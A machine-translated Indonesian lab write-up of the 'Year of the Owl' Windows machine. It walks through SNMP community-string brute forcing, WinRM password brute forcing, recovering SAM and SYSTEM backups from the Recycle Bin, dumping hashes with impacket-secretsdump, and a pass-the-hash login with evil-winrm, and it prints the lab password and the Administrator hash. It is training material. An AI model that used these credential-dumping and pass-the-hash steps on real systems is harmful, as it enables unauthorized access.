---
title: "Year of the owl"
description: "Enum TCP: UDP: Saya telah mencari banyak cara untuk mengakses port TCP tetapi tidak ada yang berhasil, jadi saya beralih ke UDP. Perilaku uniknya adalah ketika saya melakukan pemindaian tanpa menggunakan top-ports."
lang: "id"
translationKey: "year-of-the-owl"
category: "lab-writeups"
tags: ["Lab", "Dump hash mimikatz", "RecycleBin", "Snmp", "Windows"]
publishDate: "2025-06-04"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "2085fca1-ed80-8061-8b65-f76794da5827"
notionUrl: "https://app.notion.com/p/Year-of-the-owl-2085fca1ed8080618b65f76794da5827"
notionLastEdited: "2025-06-06T15:02:00.000Z"
---

# Enum

TCP:

```bash
nmap -sCV -Pn -n -p- 10.10.188.38
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 06:45 WIB
Stats: 0:04:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.28% done; ETC: 06:54 (0:04:24 remaining)
Nmap scan report for 10.10.188.38
Host is up (0.23s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: Year of the Owl
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: Year of the Owl
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=year-of-the-owl
| Not valid before: 2025-06-03T23:45:54
|_Not valid after:  2025-12-03T23:45:54
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-04T23:54:19+00:00
|_ssl-date: 2025-06-04T23:54:59+00:00; +48s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-04T23:54:22
|_  start_date: N/A
|_clock-skew: mean: 47s, deviation: 0s, median: 47s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

UDP:

```bash
sudo nmap -sUV 10.10.98.154 --top-ports 10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 11:34 WIB
Nmap scan report for year-of-the-owl (10.10.98.154)
Host is up (0.27s latency).

PORT     STATE         SERVICE      VERSION
53/udp   open|filtered domain
67/udp   open|filtered dhcps
123/udp  open|filtered ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m
```

Saya telah mencari berbagai cara untuk mengakses port TCP tetapi tidak ada yang berhasil, jadi saya beralih ke UDP. Perilaku uniknya adalah ketika saya melakukan pemindaian tanpa menggunakan opsi top-ports, saya tidak mendapatkan apa pun. Jadi sekarang mari kita selami lebih dalam layanan SNMP pada port 161.

Saya tahu ini, karena saya pernah mengalami kesulitan dan membaca tulisan orang lain.

## Port 161 - snmp

Pertama, kita melakukan brute force community string pada SNMP menggunakan alat OneSixtyone.

```bash
onesixtyone <MACHINE-IP> -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```

![](/images/year-of-the-owl/d4475d965e30.png)

Setelah mendapatkan community string (OpenView), kita melakukan enumerasi lagi menggunakan alat snmp-check seperti berikut ini.

```bash
snmp-check 10.10.164.87 -c openview
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.164.87:161 using SNMPv1 and community 'openview'

[*] System information:

  Host IP address               : 10.10.164.87
  Hostname                      : year-of-the-owl
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
  Contact                       : -
  Location                      : -
  Uptime snmp                   : 00:08:31.57
  Uptime system                 : 00:07:29.72
  System date                   : 2025-6-5 08:12:50.2
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount  

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 163
  TCP segments sent             : 245
  TCP segments retrans          : 134
  Input datagrams               : 3725
  Delivered datagrams           : 3797
  Output datagrams              : 705

[*] Network interfaces:

  Interface                     : [ up ] Software Loopback Interface 1
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 1073 Mbps
  MTU                           : 1500
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft 6to4 Adapter
  Id                            : 2
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft IP-HTTPS Platform Adapter
  Id                            : 3
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
  Id                            : 4
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Intel(R) 82574L Gigabit Network Connection
  Id                            : 5
  Mac Address                   : 00:0c:29:02:45:89
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Teredo Tunneling Adapter
  Id                            : 6
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] AWS PV Network Device #0
  Id                            : 7
  Mac Address                   : 02:6d:20:42:63:dd
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 342220
  Out octets                    : 219986

  Interface                     : [ up ] AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter-0000
  Id                            : 8
  Mac Address                   : 02:6d:20:42:63:dd
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 342220
  Out octets                    : 219986

  Interface                     : [ up ] AWS PV Network Device #0-QoS Packet Scheduler-0000
  Id                            : 9
  Mac Address                   : 02:6d:20:42:63:dd
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 342220
  Out octets                    : 219986

  Interface                     : [ up ] AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-0000
  Id                            : 10
  Mac Address                   : 02:6d:20:42:63:dd
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 342220
  Out octets                    : 219986


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  7                     10.10.164.87          255.255.0.0           1                   
  1                     127.0.0.1             255.0.0.0             1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.0.1             0.0.0.0               25                  
  10.10.0.0             10.10.164.87          255.255.0.0           281                 
  10.10.164.87          10.10.164.87          255.255.255.255       281                 
  10.10.255.255         10.10.164.87          255.255.255.255       281                 
  127.0.0.0             127.0.0.1             255.0.0.0             331                 
  127.0.0.1             127.0.0.1             255.255.255.255       331                 
  127.255.255.255       127.0.0.1             255.255.255.255       331                 
  169.254.169.123       10.10.0.1             255.255.255.255       50                  
  169.254.169.249       10.10.0.1             255.255.255.255       50                  
  169.254.169.250       10.10.0.1             255.255.255.255       50                  
  169.254.169.251       10.10.0.1             255.255.255.255       50                  
  169.254.169.253       10.10.0.1             255.255.255.255       50                  
  169.254.169.254       10.10.0.1             255.255.255.255       50                  
  224.0.0.0             127.0.0.1             240.0.0.0             331                 
  255.255.255.255       127.0.0.1             255.255.255.255       331                 

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               443                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               3306                  0.0.0.0               0                     listen              
  0.0.0.0               3389                  0.0.0.0               0                     listen              
  0.0.0.0               5985                  0.0.0.0               0                     listen              
  0.0.0.0               47001                 0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49670                 0.0.0.0               0                     listen              
  10.10.164.87          139                   0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               123                 
  0.0.0.0               161                 
  0.0.0.0               3389                
  0.0.0.0               5353                
  0.0.0.0               5355                
  10.10.164.87          137                 
  10.10.164.87          138                 
  127.0.0.1             59715               

[*] Network services:

  Index                 Name                
  0                     Power               
  1                     mysql               
  2                     Server              
  3                     Themes              
  4                     SysMain             
  5                     Apache2.4           
  6                     IP Helper           
  7                     DNS Client          
  8                     DHCP Client         
  9                     Time Broker         
  10                    Workstation         
  11                    SNMP Service        
  12                    User Manager        
  13                    Windows Time        
  14                    CoreMessaging       
  15                    Plug and Play       
  16                    Print Spooler       
  17                    Task Scheduler      
  18                    Windows Update      
  19                    Remote Registry     
  20                    Amazon SSM Agent    
  21                    CNG Key Isolation   
  22                    COM+ Event System   
  23                    Windows Event Log   
  24                    IPsec Policy Agent  
  25                    Group Policy Client 
  26                    RPC Endpoint Mapper 
  27                    AWS Lite Guest Agent
  28                    Device Setup Manager
  29                    Network List Service
  30                    System Events Broker
  31                    User Profile Service
  32                    Base Filtering Engine
  33                    Local Session Manager
  34                    TCP/IP NetBIOS Helper
  35                    Cryptographic Services
  36                    Certificate Propagation
  37                    Remote Desktop Services
  38                    Shell Hardware Detection
  39                    Diagnostic Policy Service
  40                    Network Connection Broker
  41                    Security Accounts Manager
  42                    Windows Defender Firewall
  43                    Network Location Awareness
  44                    Windows Connection Manager
  45                    Windows Font Cache Service
  46                    Remote Procedure Call (RPC)
  47                    Update Orchestrator Service
  48                    User Access Logging Service
  49                    DCOM Server Process Launcher
  50                    Remote Desktop Configuration
  51                    Network Store Interface Service
  52                    Client License Service (ClipSVC)
  53                    Distributed Link Tracking Client
  54                    Capability Access Manager Service
  55                    System Event Notification Service
  56                    Connected Devices Platform Service
  57                    Windows Defender Antivirus Service
  58                    Windows Management Instrumentation
  59                    Distributed Transaction Coordinator
  60                    Microsoft Account Sign-in Assistant
  61                    Background Tasks Infrastructure Service
  62                    Connected User Experiences and Telemetry
  63                    WinHTTP Web Proxy Auto-Discovery Service
  64                    Windows Push Notifications System Service
  65                    Windows Remote Management (WS-Management)
  66                    Remote Desktop Services UserMode Port Redirector
  67                    Windows Defender Antivirus Network Inspection Service

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     running               System Idle Process                                             
  4                     running               System                                                          
  68                    running               Registry                                                        
  100                   running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted -p
  412                   running               smss.exe                                                        
  516                   running               dwm.exe                                                         
  564                   running               csrss.exe                                                       
  628                   running               svchost.exe           C:\Windows\system32\  -k netsvcs -p       
  636                   running               csrss.exe                                                       
  652                   running               wininit.exe                                                     
  692                   running               winlogon.exe                                                    
  752                   running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted -p
  756                   running               services.exe                                                    
  772                   running               lsass.exe             C:\Windows\system32\                      
  836                   running               svchost.exe           C:\Windows\System32\  -k termsvcs         
  880                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch -p    
  904                   running               fontdrvhost.exe                                                 
  912                   running               fontdrvhost.exe                                                 
  976                   running               svchost.exe           C:\Windows\system32\  -k RPCSS -p         
  1216                  running               svchost.exe           C:\Windows\system32\  -k LocalService -p  
  1300                  running               svchost.exe           C:\Windows\System32\  -k NetworkService -p
  1328                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted -p
  1340                  running               MsMpEng.exe                                                     
  1376                  running               snmp.exe              C:\Windows\System32\                      
  1484                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetworkFirewall -p
  1500                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork -p
  1508                  running               amazon-ssm-agent.exe  C:\Program Files\Amazon\SSM\                      
  1788                  running               svchost.exe           C:\Windows\system32\  -k netsvcs          
  1804                  running               LiteAgent.exe         C:\Program Files\Amazon\XenTools\                      
  1852                  running               spoolsv.exe           C:\Windows\System32\                      
  1972                  running               svchost.exe           C:\Windows\System32\  -k utcsvc -p        
  2044                  running               svchost.exe           C:\Windows\system32\  -k LocalService     
  2100                  running               httpd.exe             C:\xampp\apache\bin\  -k runservice       
  2156                  running               mysqld.exe            C:\xampp\mysql\bin\   --defaults-file=c:\xampp\mysql\bin\my.ini mysql
  2168                  running               svchost.exe           C:\Windows\System32\  -k smbsvcs          
  2352                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted -p
  2824                  running               LogonUI.exe                                 /flags:0x2 /state0:0xa3a7c055 /state1:0x41c64e6d
  3156                  running               NisSrv.exe                                                      
  3292                  running               msdtc.exe             C:\Windows\System32\                      
  3364                  running               httpd.exe             C:\xampp\apache\bin\  -d C:/xampp/apache  
  4272                  running               svchost.exe                                                     
  4380                  running               CompatTelRunner.exe   C:\Windows\system32\                      
  4556                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  4976                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
  5004                  running               svchost.exe           C:\Windows\system32\  -k appmodel -p      

[*] Storage information:

  Description                   : ["C:\\ Label:  Serial Number 7c0c3814"]
  Device id                     : [#<SNMP::Integer:0x00007fbb188229b0 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007fbb18820e08 @value=4096>]
  Memory size                   : 19.46 GB
  Memory used                   : 15.49 GB

  Description                   : ["Virtual Memory"]
  Device id                     : [#<SNMP::Integer:0x00007fbb1883bfa0 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007fbb1883a448 @value=65536>]
  Memory size                   : 3.12 GB
  Memory used                   : 862.88 MB

  Description                   : ["Physical Memory"]
  Device id                     : [#<SNMP::Integer:0x00007fbb18835768 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007fbb18833c88 @value=65536>]
  Memory size                   : 2.00 GB
  Memory used                   : 766.81 MB


[*] File system information:

  Index                         : 1
  Mount point                   : 
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 0

[*] Device information:

  Id                    Type                  Status                Descr               
  1                     unknown               running               Microsoft XPS Document Writer v4
  2                     unknown               running               Microsoft Print To PDF
  3                     unknown               running               Unknown Processor Type
  4                     unknown               unknown               Software Loopback Interface 1
  5                     unknown               unknown               Microsoft 6to4 Adapter
  6                     unknown               unknown               Microsoft IP-HTTPS Platform Adapter
  7                     unknown               unknown               Microsoft Kernel Debug Network Adapter
  8                     unknown               unknown               Intel(R) 82574L Gigabit Network Connection
  9                     unknown               unknown               Microsoft Teredo Tunneling Adapter
  10                    unknown               unknown               AWS PV Network Device #0
  11                    unknown               unknown               AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter
  12                    unknown               unknown               AWS PV Network Device #0-QoS Packet Scheduler-0000
  13                    unknown               unknown               AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-
  14                    unknown               running               Fixed Disk          
  15                    unknown               running               Fixed Disk          
  16                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)
  17                    unknown               unknown               COM1:               

[*] Software components:

  Index                 Name                
  1                     XAMPP               
  2                     Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.11.25325
  3                     Microsoft Visual C++ 2017 x64 Additional Runtime - 14.11.25325
  4                     Amazon SSM Agent    
  5                     Amazon SSM Agent    
  6                     Microsoft Visual C++ 2017 Redistributable (x64) - 14.11.25325
```

Dari langkah sebelumnya kita mendapatkan beberapa nama pengguna yang valid, jadi mari kita lakukan serangan brute force pada port winrm dengan salah satu nama pengguna yang valid tersebut.

![](/images/year-of-the-owl/d03a70607316.png)

Ya, saya mengerti sekarang kita memiliki kredensial yang valid `Jareth:sarah` mari kita masuk ke server menggunakan winrm

![](/images/year-of-the-owl/968e92483837.png)

Oke, sekarang kita sudah memiliki flag user. Mari kita lakukan privesc untuk mendapatkan authority user.

# WinPriv

Saya ingin memindai target menggunakan alat enumerasi otomatis, tetapi ketika saya ingin mentransfer alat tersebut ke server, saya mendapatkan kesalahan berikut.

![](/images/year-of-the-owl/4b711c075b64.png)

Saya tidak tahu mengapa, tetapi ketika saya mentransfernya tanpa menggunakan certutil dan saya mentransfer winpeas.ps1, prosesnya berhasil.

![](/images/year-of-the-owl/94f2acb68da5.png)

Saat menjalankan winpeas.ps1, kami menemukan sesuatu yang menarik di tempat sampah, yaitu sam.bak.

![](/images/year-of-the-owl/a4ddbb579d57.png)

Mari kita periksa secara manual di Recycle Bin, tetapi saya tidak dapat melihat direktori Recycle.Bin seperti yang dikatakan Winpeas kepada saya.

![](/images/year-of-the-owl/c35722de7cdd.png)

Mari kita gunakan perintah berikut untuk menampilkan direktori tersembunyi.

```bash
gci -hidden .
```

![](/images/year-of-the-owl/2ed536b64402.png)

Oke, sekarang mari kita periksa direktori **$Recycle.Bin** dan ambil beberapa file.

![](/images/year-of-the-owl/5301fe380f3c.png)

![](/images/year-of-the-owl/87686a140fe0.png)

Setelah kedua file berhasil diunduh, kita perlu mengambil hash-nya menggunakan impacket.

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

![](/images/year-of-the-owl/635b52d4b3b5.png)

Setelah mendapatkan hash NTLM dari pengguna administrator, kami meneruskan hash tersebut untuk masuk ke server.

```bash
evil-winrm -i 10.10.63.148 -u 'Administrator' -p 'aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a'
```

![](/images/year-of-the-owl/2a544219596e.png)

Ya, kami telah mendapatkan bendera pengguna admin.
